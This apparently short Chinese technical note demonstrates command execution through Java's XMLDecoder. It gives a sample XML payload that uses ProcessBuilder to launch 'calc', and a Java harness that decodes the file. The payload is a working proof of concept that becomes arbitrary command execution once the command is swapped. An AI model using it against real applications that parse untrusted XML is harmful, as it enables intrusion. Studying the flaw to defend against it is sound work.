Java 调用XMLDecoder解析XML文件的时候，存在命令执行漏洞。



样例XML文件如下所示：

<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_131" class="java.beans.XMLDecoder">
	<object class="java.lang.ProcessBuilder">
		<array class="java.lang.String" length="1">
			<void index="0">
				<string>calc</string>
			</void>
		</array>
		<void method="start" />
	</object>
</java>


对应Java代码如下所示：

package xmldecoder;

import java.io.BufferedInputStream;  
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;  
import java.util.ArrayList;  
import java.util.List;

  


public class XmlDecoderTest {

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		java.io.File file = new java.io.File("d:/tmp/xmldecoder.xml");
		
		java.beans.XMLDecoder xd = null;
		try {
			xd = new java.beans.XMLDecoder(new BufferedInputStream(new FileInputStream(file)));
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}  
		  
        Object s2 = xd.readObject();  
        xd.close();
	}

}

